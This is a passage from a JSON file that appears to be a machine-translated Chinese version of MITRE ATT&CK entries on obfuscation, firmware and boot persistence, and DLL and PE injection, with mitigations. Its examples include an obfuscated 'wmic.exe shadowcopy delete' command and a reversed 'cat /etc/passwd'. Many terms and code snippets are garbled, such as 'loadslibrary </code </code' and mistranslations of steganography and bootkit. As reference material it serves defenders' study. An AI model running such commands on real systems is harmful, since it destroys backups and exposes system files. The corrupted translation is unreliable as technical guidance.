          "content": "对手可以使用二进制填充来添加垃圾数据并更改恶意软件的盘表示。这可以在不影响二进制的功能或行为的情况下完成，但是可以将二进制的大小增加超出某些安全工具由于文件尺寸限制而能够处理的功能。"
        }
      ],
      [
        {
          "type": "text",
          "content": "二进制填充有效地更改了文件的校验和，也可以用于避免基于哈希的区块列表和静态防病毒特征。所使用的填充物通常由一个函数生成以创建垃圾数据，然后将其附加到末尾或应用于恶意软件各节。增加文件大小可能会降低未设计或配置用于扫描大文件的某些工具和检测功能的有效性。这也可能降低被收集的可能性进行分析。公共文件扫描服务（例如Virustotal）限制了要分析上传的文件的最大大小。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1027.002",
    "name": "Software Packing",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Obfuscated Files or Information",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以执行软件包装或虚拟机软件保护以隐藏其代码。软件包装是一种压缩或加密可执行文件的方法。包装可执行文件更改文件签名，以避免基于签名的检测。大多数减压技术在内存中解压缩可执行代码。虚拟机软件保护将可执行文件的原始代码转换为一种特殊格式，只有特殊的虚拟机才能运行。然后调用虚拟机以运行此代码。"
        }
      ],
      [
        {
          "type": "text",
          "content": "用于执行软件包装的实用程序称为包装工。示例包装工是mpress和upx。提供了更全面的已知包装工列表，但是对手可能会创建自己的包装技术，这些技术不会留下相同的文物作为逃避防御的著名包装工。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1049",
        "name": "防病毒/反疑问软件",
        "description": [
          [
            {
              "type": "text",
              "content": "采用基于启发式的恶意软件检测。确保更新的病毒定义并为观察到的恶意软件创建自定义签名。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1027.003",
    "name": "Steganography",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Obfuscated Files or Information",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用隐肌技术来防止发现隐藏的信息。地理技术可用于在数字媒体中隐藏数据，例如图像，音轨，视频剪辑或文本文件。"
        }
      ],
      [
        {
          "type": "text",
          "content": "Duqu是使用模板造影的恶意软件的早期例子。它加密了从受害者系统中收集的信息，并将其隐藏在图像中，然后再将图像渗入C2服务器。"
        }
      ],
      [
        {
          "type": "text",
          "content": "到2017年底，一个威胁组使用"
        },
        {
          "type": "code",
          "content": " Invoke-psimage "
        },
        {
          "type": "text",
          "content": "将PowerShell命令隐藏在图像文件（.png）中并在受害者系统上执行代码。在这种特殊情况下，PowerShell代码下载了另一个混淆的脚本，以从受害者的机器中收集智能并将其传达给对手。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1027.004",
    "name": "Compile After Delivery",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Obfuscated Files or Information",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会试图通过将文件作为未编译的代码传递给受害者，从而使有效载荷难以发现和分析。基于文本的源代码文件可能会从针对可执行组/二进制文件的保护措施中颠覆分析和审查。这些有效载荷需要在执行前进行编译；通常通过本机实用程序，例如csc.exe或gcc/mingw。"
        }
      ],
      [
        {
          "type": "text",
          "content": "源代码有效载荷也可以被加密，编码和/或嵌入其他文件，例如作为网络钓鱼传递的文件。有效载荷也可以以无法识别的格式传递，并且本质上对本机OS（MACOS/Linux上的EXES）固有良性，然后再将（re）编译成具有捆绑编译器和执行框架的适当可执行二进制文件。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1027.005",
    "name": "Indicator Removal from Tools",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Obfuscated Files or Information",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "如果对手认为他们的恶意工具被发现，隔离或以其他方式限制，则可以从工具中删除指标。他们可以通过删除指示器并使用目标防御系统或可能使用类似系统的后续目标来修改工具。"
        }
      ],
      [
        {
          "type": "text",
          "content": "一个很好的例子是，当通过文件签名检测到恶意软件并由防病毒软件隔离时。一个可以确定恶意软件的对手，因为其文件签名可能会修改文件以明确避免该签名，然后重新使用恶意软件。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1027.006",
    "name": "HTML Smuggling",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Obfuscated Files or Information",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过将恶意有效载荷隐藏在看似良性的HTML文件中，从而将数据和过去的内容过滤器走私。HTML文档可以存储称为JavaScript Blobs的大型二进制对象（代表原始字节的不可变化数据），后来可以将其构造为类似文件的对象。数据也可以存储在数据URL中，该数据URL可以嵌入媒体类型或HTML文档中的MIME文件。HTML5还引入了一个下载属性，该属性可用于启动文件下载。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以通过滥用JavaScript Blobs和/或HTML5下载属性，向通过HTML走私绕过安全控制的受害者提供有效载荷。诸如Web内容过滤器之类的安全控件可能无法识别HTML/JS文件中的走私的恶意文件，因为该内容可能基于通常基于良性的MIME类型，例如"
        },
        {
          "type": "code",
          "content": "  text/plain "
        },
        {
          "type": "text",
          "content": "和/或/或"
        },
        {
          "type": "code",
          "content": " text text/html "
        },
        {
          "type": "text",
          "content": "。恶意文件或数据可以通过数据URL和/或JavaScript Blobs混淆并隐藏在HTML文件内部，并且当它们到达受害者时可以被删除（即DeObfuscate/Decode文件或信息），可能会绕过内容过滤器。"
        }
      ],
      [
        {
          "type": "text",
          "content": "例如，可以滥用JavaScript Blobs在受害机器中动态生成恶意文件，并可以通过滥用JavaScript函数（例如"
        },
        {
          "type": "code",
          "content": " msSave> mssaveblob "
        },
        {
          "type": "text",
          "content": "）将其丢弃到磁盘。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1048",
        "name": "应用隔离和沙箱",
        "description": [
          [
            {
              "type": "text",
              "content": "浏览器沙箱可用于减轻剥削的某些影响，但是沙盒逃逸仍然可能存在。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1027.007",
    "name": "Dynamic API Resolution",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Obfuscated Files or Information",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会混淆，然后动态解析其恶意软件所调用的API功能，以掩盖恶意功能并损害防御性分析。恶意软件通常使用OS提供的各种本机API功能来执行各种任务，例如涉及过程，文件和其他系统工件的任务。"
        }
      ],
      [
        {
          "type": "text",
          "content": "恶意软件调用的API功能可能会留下静态工件，例如有效载荷文件中的字符串。防御性分析师还可以发现二进制文件可以通过导入地址表（IAT）执行哪些功能，或者有助于动态地将调用代码链接到提供功能的共享模块的其他结构。"
        }
      ],
      [
        {
          "type": "text",
          "content": "为了避免静态或其他防御分析，对手可能会使用动态API分辨率来掩盖恶意软件的特征和功能。与软件包装相似，动态API分辨率可能会更改文件签名并混淆恶意API函数调用，直到在运行时解决并调用它们。"
        }
      ],
      [
        {
          "type": "text",
          "content": "可以使用各种方法来混淆对API功能的恶意软件调用。例如，功能名称的哈希通常存储在恶意软件中，以代替字面的字符串。恶意软件可以使用这些哈希（或其他标识符）使用诸如"
        },
        {
          "type": "code",
          "content": " getProcaddress（）"
        },
        {
          "type": "text",
          "content": " and "
        },
        {
          "type": "code",
          "content": " loadlibrary（）"
        },
        {
          "type": "text",
          "content": "之类的功能来手动复制链接和加载过程。这些哈希/标识符也可以使用加密或其他字符串操纵技巧进一步混淆（在执行过程中需要各种形式的DeobFuscate/Decode文件或信息）。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1027.008",
    "name": "Stripped Payloads",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Obfuscated Files or Information",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会试图通过删除符号，字符串和其他人类可读信息来使有效载荷难以分析。脚本和可执行文件可能包含变量名称和其他字符串，可帮助开发人员记录代码功能。符号通常是由操作系统的"
        },
        {
          "type": "code",
          "content": "链接器"
        },
        {
          "type": "text",
          "content": "创建的。反向工程师使用这些符号和字符串来分析代码并识别有效载荷中的功能。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会使用剥离的有效载荷，以使恶意软件分析更加困难。例如，编译器和其他工具可以提供删除或混淆字符串和符号的功能。对手还使用了剥离的有效载荷格式，例如仅运行的AppleScripts（Applescript）的AppleScript版本，以逃避检测和分析。缺乏可读的信息可能会直接阻碍有效载荷的检测和分析。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1027.009",
    "name": "Embedded Payloads",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Obfuscated Files or Information",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以将有效载荷嵌入其他文件中，以隐藏恶意内容防御。否则，看似良性的文件（例如脚本和可执行文件）可能会滥用以携带和混淆恶意有效载荷和内容。在某些情况下，嵌入式有效载荷也可能使对手能够通过不影响执行控件（例如数字签名和公证票）来颠覆信任控制。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以以各种文件格式嵌入有效载荷以隐藏有效载荷。这类似于隐身志，尽管不涉及将恶意内容编织到与合法数字媒体格式相关的特定字节和模式中。"
        }
      ],
      [
        {
          "type": "text",
          "content": "例如，已经观察到对手嵌入有效载荷内或作为原本良性二进制的叠加层。还观察到对手在同一格式的文件中嵌套有效载荷（例如可执行文件和仅运行脚本）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "嵌入式内容也可以用作用于感染良性系统过程的过程注入有效载荷。然后将这些嵌入的注射有效载荷用作恶意软件模块的一部分，旨在提供特定功能，例如加密C2通信以支持编排模块。例如，可以将嵌入式模块注入默认浏览器中，从而使对手可以通过网络进行通信。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1049",
        "name": "防病毒/反疑问软件",
        "description": [
          [
            {
              "type": "text",
              "content": "防病毒可用于自动检测和隔离可疑文件。"
            }
          ]
        ]
      },
      {
        "id": "M1040",
        "name": "预防端点的行为",
        "description": [
          [
            {
              "type": "text",
              "content": "在Windows 10上，启用攻击表面减少（ASR）规则，以防止执行潜在的混淆脚本。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1027.010",
    "name": "Command Obfuscation",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Obfuscated Files or Information",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会在命令执行过程中混淆内容以阻碍检测。命令行混淆是一种在命令和脚本中制作字符串和模式的方法，更难以签名和分析。这种类型的混淆可以包含在通过命令和脚本解释器进行交付的有效负载（例如网络钓鱼和妥协）执行的命令中。"
        }
      ],
      [
        {
          "type": "text",
          "content": "例如，对手可能会滥用使用各种符号和逃脱字符的语法（例如间距，"
        },
        {
          "type": "code",
          "content": "^"
        },
        {
          "type": "text",
          "content": "，"
        },
        {
          "type": "code",
          "content": "+"
        },
        {
          "type": "text",
          "content": "。"
        },
        {
          "type": "code",
          "content": " $ "
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": "％"
        },
        {
          "type": "text",
          "content": "）在维护相同的预期功能的同时，难以分析命令。许多语言以基本64或URL编码的形式支持内置混淆。对手还可以通过字符串拆分（"
        },
        {
          "type": "code",
          "content": "“ wor”+“ d.Application” "
        },
        {
          "type": "text",
          "content": "），字符的顺序和套管（"
        },
        {
          "type": "code",
          "content": " rev <<<'dwssap/cte/tac'"
        },
        {
          "type": "text",
          "content": "），Globing（"
        },
        {
          "type": "code",
          "content": " mkdir -p'/tmp/：＆$ nia'"
        },
        {
          "type": "text",
          "content": "），以及涉及通过令牌/环境变量/输入流的各种技巧。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手也可以使用诸如目录遍历之类的技巧来混淆命令所调用的二进制文件（"
        },
        {
          "type": "code",
          "content": " c：\\ voi \\ pcw \\ .. \\ .. \\ .. \\ Windows \\ tei \\ tei \\ qs \\ k \\ .. \\ .. \\ ..\\ .. \\ system32 \\ erool \\ .. \\ wbem \\ wg \\ je \\ .. \\ .. \\ wmic.exe shadowcopy delete "
        },
        {
          "type": "text",
          "content": "）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "<code> Indoke-Obfuscation之类的工具也已用于混淆命令。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1049",
        "name": "防病毒/反疑问软件",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑在处理/解释后，考虑使用Windows 10+上的Antimalware扫描接口（AMSI）来分析命令。"
            }
          ]
        ]
      },
      {
        "id": "M1040",
        "name": "预防端点的行为",
        "description": [
          [
            {
              "type": "text",
              "content": "在Windows 10+上，启用攻击表面减少（ASR）规则以阻止可能混淆的脚本的执行。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1027.011",
    "name": "Fileless Storage",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Obfuscated Files or Information",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以将数据存储在“无归档”格式中，以掩盖恶意活动中的防御措施。无归档存储可以广泛定义为文件以外的任何格式。非易失性无档案存储的常见示例包括Windows注册表，事件日志或WMI存储库。"
        }
      ],
      [
        {
          "type": "text",
          "content": "类似于无备件的内存性行为，例如反射代码加载和过程注入，无归档数据存储可能仍未被反病毒和其他端点安全工具所发现，这些工具只能从磁盘存储中访问特定的文件格式。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用无归档存储来隐藏各种类型的存储数据，包括有效载荷/shellCode（可能被用作持久性的一部分），并收集了尚未从受害者那里删除的数据（例如，本地数据分期）。在存储时，对手通常还会加密，编码，剪接或以其他方式混淆此无归档数据。"
        }
      ],
      [
        {
          "type": "text",
          "content": "某些形式的无归档存储活动可能会间接地在文件系统中创建工件，但是以中央和其他难以检查格式，例如WMI（例如"
        },
        {
          "type": "code",
          "content": " <Code>％SystemRoot％\\ System32 \\ wbem \\ wbem \\ repository "
        },
        {
          "type": "text",
          "content": "）或注册表（例如，"
        },
        {
          "type": "code",
          "content": "％SystemRoot％\\ System32 \\ Config "
        },
        {
          "type": "text",
          "content": "）物理文件。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑对常见的无归档存储位置（例如注册表或WMI存储库）的定期审查，以识别异常和恶意数据。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1027.012",
    "name": "LNK Icon Smuggling",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Obfuscated Files or Information",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会通过将其隐藏在看似良性的Windows快捷键文件中，将其隐藏在过去的内容过滤器中下载恶意有效载荷。Windows快捷键文件（.lnk）包含许多元数据字段，包括图标位置字段（也称为"
        },
        {
          "type": "code",
          "content": " iconenvironmentdatablock "
        },
        {
          "type": "text",
          "content": "），旨在指定要在ICON文件中指定要在LNK中显示的图标文件的路径主机目录。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会滥用此LNK元数据以下载恶意有效载荷。例如，已经使用LNK文件作为网络钓鱼有效载荷观察到对手，以提供恶意软件。调用（例如，恶意文件）后，可以下载通过LNK图标位置字段中的外部URL引用的有效载荷。然后，这些文件也可以通过命令和脚本解释器/系统二进制代理执行参数来调用LNK的目标路径字段中。"
        }
      ],
      [
        {
          "type": "text",
          "content": "LNK图标走私也可能被使用后妥协，例如在受感染主机上执行LNK的恶意脚本以下载其他恶意有效载荷。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1049",
        "name": "防病毒/反疑问软件",
        "description": [
          [
            {
              "type": "text",
              "content": "使用签名或启发式方法检测恶意LNK并随后下载文件。"
            }
          ]
        ]
      },
      {
        "id": "M1040",
        "name": "预防端点的行为",
        "description": [
          [
            {
              "type": "text",
              "content": "在Windows 10上，启用攻击表面减少（ASR）规则，以防止执行潜在的混淆脚本或有效载荷。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1542.001",
    "name": "System Firmware",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Pre-OS Boot",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会修改系统固件以持续到系统上。BIOS（基本输入/输出系统）和统一的可扩展固件接口（UEFI）或可扩展的固件接口（EFI）是系统固件的示例，可作为操作系统之间的软件接口操作和计算机的硬件。"
        }
      ],
      [
        {
          "type": "text",
          "content": "诸如BIOS和（U）EFI之类的系统固件的基础计算机功能，并且可以通过对手进行修改以执行或协助恶意活动。存在覆盖系统固件的功能，这可能会使精致的对手是安装恶意固件更新的手段，以此作为在可能难以检测到的系统上持久性的手段。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1046",
        "name": "引导完整性",
        "description": [
          [
            {
              "type": "text",
              "content": "检查现有的BIOS或EFI的完整性，以确定它是否容易受到修改。使用受信任的平台模块技术。将系统的信任根源移至硬件，以防止SPI闪存篡改。Intel Boot Guard等技术可以为此提供帮助。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "防止对手访问特权帐户或执行此技术所需的访问。"
            }
          ]
        ]
      },
      {
        "id": "M1051",
        "name": "更新软件",
        "description": [
          [
            {
              "type": "text",
              "content": "必要时修补BIOS和EFI。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1542.002",
    "name": "Component Firmware",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Pre-OS Boot",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以修改组件固件以持续在系统上。一些对手可能会采用复杂的手段来损害计算机组件并安装恶意固件，以在操作系统和主系统固件或BIOS之外执行对手代码。该技术可能类似于系统固件，但在其他系统组件/设备上进行的功能可能没有相同的功能或完整性检查水平。"
        }
      ],
      [
        {
          "type": "text",
          "content": "尽管潜在的典型失败无法维护访问和硬盘重新形象，但恶意组件固件仍可以提供对系统的持续级别，也可以提供逃避基于主机软件的防御和完整性检查的方法。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1051",
        "name": "更新软件",
        "description": [
          [
            {
              "type": "text",
              "content": "执行定期的固件更新，以减轻剥削和/或滥用的风险。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1542.003",
    "name": "Bootkit",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Pre-OS Boot",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用靴子持续在系统上。靴子套件位于操作系统以下的一层，除非组织怀疑使用并可以采取相应的行动，否则可能很难执行完整的补救。"
        }
      ],
      [
        {
          "type": "text",
          "content": "BootKit是一种恶意软件变体，可修改硬盘驱动器的引导扇区，包括主启动记录（MBR）和音量启动记录（VBR）。MBR是BIOS完成硬件初始化后首先加载的磁盘部分。这是引导加载程序的位置。对启动驱动器的原始访问权限的对手可以覆盖此区域，将启动期间的执行从普通引导加载器转移到对手代码。"
        }
      ],
      [
        {
          "type": "text",
          "content": "MBR将启动过程的控制权传递给VBR。与MBR的情况类似，对启动驱动器的原始访问的对手可以覆盖VBR在启动期间转移执行到对手代码。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1046",
        "name": "引导完整性",
        "description": [
          [
            {
              "type": "text",
              "content": "使用受信任的平台模块技术和安全或受信任的启动过程，以防止系统完整性受到损害。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "确保获得适当的权限，以防止对手访问安装靴子所需的特权帐户。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1542.004",
    "name": "ROMMONkit",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Pre-OS Boot",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会通过加载未经授权的固件使用对手代码来滥用ROM监视器（Rommon），以提供持久的访问并操纵难以检测的设备行为。"
        }
      ],
      [
        {
          "type": "text",
          "content": "Rommon是一种Cisco Network设备固件，可作为引导加载程序，启动图像或启动助手的功能，以便在平台上电动或重置时初始化硬件和软件。与TFTP启动类似，对手可以使用对手代码在本地或远程（例如通过TFTP）升级Rommon映像，并重新启动设备以覆盖现有的Rommon Image。这为对手提供了更新Rommon的方法，以可能难以检测的方式在系统上获得持久性。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "定期检查系统图像的完整性，以确保其未经修改。"
            }
          ]
        ]
      },
      {
        "id": "M1046",
        "name": "引导完整性",
        "description": [
          [
            {
              "type": "text",
              "content": "启用安全引导功能，使用特殊用途硬件设备验证引导环境和系统映像的数字签名。如果验证检查失败，则该设备将无法启动防止未经授权的软件加载。"
            }
          ]
        ]
      },
      {
        "id": "M1031",
        "name": "网络入侵预防",
        "description": [
          [
            {
              "type": "text",
              "content": "使用网络签名来识别特定协议（例如TFTP）的流量，可以使用网络入侵检测和预防系统来减轻网络级别的活动。签名通常用于协议中的唯一指标，并且可能基于特定对手或工具使用的特定技术，并且在各种网络配置中可能会有所不同。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1542.005",
    "name": "TFTP Boot",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Pre-OS Boot",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用NetBooting从琐碎的文件传输协议（TFTP）服务器加载未经授权的网络设备操作系统。网络管理员通常使用TFTP启动（NetBooting）来加载配置控制的网络设备从中央管理服务器加载。NetBooting是引导序列中的一个选项，可用于集中，管理和控制设备图像。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以操纵网络设备上的配置，以指定使用恶意TFTP服务器的使用，该配置可以与修改系统图像一起使用，以在设备启动或重置上加载修改的图像。未经授权的图像允许对手修改设备配置，向设备添加恶意功能，并引入后门以维护网络设备的控制，同时通过使用标准功能最小化检测。该技术类似于RommonKit，可能会导致网络设备运行修改后的图像。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "定期检查运行配置和系统映像的完整性，以确保未修改它们。"
            }
          ]
        ]
      },
      {
        "id": "M1046",
        "name": "引导完整性",
        "description": [
          [
            {
              "type": "text",
              "content": "启用安全引导功能，使用特殊用途硬件设备验证引导环境和系统映像的数字签名。如果验证检查失败，则该设备将无法启动防止未经授权的软件加载。"
            }
          ]
        ]
      },
      {
        "id": "M1035",
        "name": "限制网络对资源的访问",
        "description": [
          [
            {
              "type": "text",
              "content": "限制了没有加密或身份验证机制的协议的使用。限制从不受信任的网络来源访问管理和管理接口。"
            }
          ]
        ]
      },
      {
        "id": "M1031",
        "name": "网络入侵预防",
        "description": [
          [
            {
              "type": "text",
              "content": "使用网络签名来识别特定协议（例如TFTP）的流量，可以使用网络入侵检测和预防系统来减轻网络级别的活动。签名通常用于协议中的唯一指标，并且可能基于特定对手或工具使用的特定技术，并且在各种网络配置中可能会有所不同。"
            }
          ]
        ]
      },
      {
        "id": "M1028",
        "name": "操作系统配置",
        "description": [
          [
            {
              "type": "text",
              "content": "遵循供应商设备硬化最佳实践，以禁用不必要的和未使用的功能和服务，避免使用默认配置和密码，并引入记录和审核以进行检测。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "使用身份验证，授权和会计（AAA）系统将限制管理员可以执行并提供用户操作的历史记录，以检测未经授权的使用和滥用。TACACS+可以通过配置身份验证和命令授权来控制哪些命令管理员可以使用哪些命令。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1055.001",
    "name": "Dynamic-link Library Injection",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Process Injection",
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以将动态链接库（DLL）注入过程中，以逃避基于过程的防御，并可能提高特权。DLL注入是在单独的实时过程的地址空间中执行任意代码的一种方法。"
        }
      ],
      [
        {
          "type": "text",
          "content": "DLL注入通常是通过在目标过程的虚拟地址空间中编写通往DLL的路径，然后通过调用新线程加载DLL。可以使用本机Windows API调用（例如"
        },
        {
          "type": "code",
          "content": " virtualAlloCex "
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": " writeProcessMemory "
        },
        {
          "type": "text",
          "content": "）执行写入，然后用"
        },
        {
          "type": "code",
          "content": " createRemoteThread "
        },
        {
          "type": "text",
          "content": "（称为"
        },
        {
          "type": "code",
          "content": " load> loadslibrary </code </code </code "
        },
        {
          "type": "text",
          "content": "）/代码> API负责加载DLL）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "该方法的变体，例如反射性DLL注入（将自映射DLL写入一个过程）和内存模块（写入进程时的MAP DLL）克服地址重定位问题以及其他API来调用执行（因为这些方法加载了加载并通过手动预定"
        },
        {
          "type": "code",
          "content": " loadLibrary "
        },
        {
          "type": "text",
          "content": "的功能来执行内存中的文件。"
        }
      ],
      [
        {
          "type": "text",
          "content": "该方法的另一种变体（通常称为模块踩踏/过载或DLL空心）可以在一个过程中隐藏注射的代码。此方法涉及将合法的DLL加载到远程过程中，然后在启动目标过程中的新线程之前，手动覆盖模块的"
        },
        {
          "type": "code",
          "content": " addressofentrypoint "
        },
        {
          "type": "text",
          "content": "。这种变化使攻击者可以通过在磁盘上使用合法的DLL文件来备份其执行，从而隐藏了恶意注射的代码。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在另一个过程的上下文中运行代码可能允许访问该过程的内存，系统/网络资源以及可能提高的特权。通过DLL注入执行还可以从安全产品中逃避检测，因为在合法过程中执行掩盖了。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1040",
        "name": "预防端点的行为",
        "description": [
          [
            {
              "type": "text",
              "content": "可以将某些端点安全解决方案配置为基于注射过程中发生的共同行为序列阻止某些类型的过程注入。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1055.002",
    "name": "Portable Executable Injection",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Process Injection",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以将便携式可执行文件（PE）注入流程中，以逃避基于过程的防御以及可能提高特权。PE注射是在单独的实时过程的地址空间中执行任意代码的一种方法。"
        }
      ],
      [
        {
          "type": "text",
          "content": "PE注射通常是通过将代码（可能没有磁盘上的文件）复制到目标过程的虚拟地址空间中来执行的，然后再通过新线程调用。可以使用本机Windows API调用（例如"
        },
        {
          "type": "code",
          "content": " virtualAlloCex "
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": " writeProcessMemory "
        },
        {
          "type": "text",
          "content": "）执行写入，然后使用"
        },
        {
          "type": "code",
          "content": " createRemoteThread "
        },
        {
          "type": "text",
          "content": "或其他代码（ex：ex：ex shellCode）调用。注射代码的位移确实引入了功能重新启动内存引用的其他要求。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在另一个过程的上下文中运行代码可能允许访问该过程的内存，系统/网络资源以及可能提高的特权。通过PE注射执行还可以从安全产品中逃避检测，因为在合法过程中掩盖了执行。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1040",
        "name": "预防端点的行为",
        "description": [
          [
            {
              "type": "text",
              "content": "可以将某些端点安全解决方案配置为基于注射过程中发生的共同行为序列阻止某些类型的过程注入。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1055.003",
    "name": "Thread Execution Hijacking",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Process Injection",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
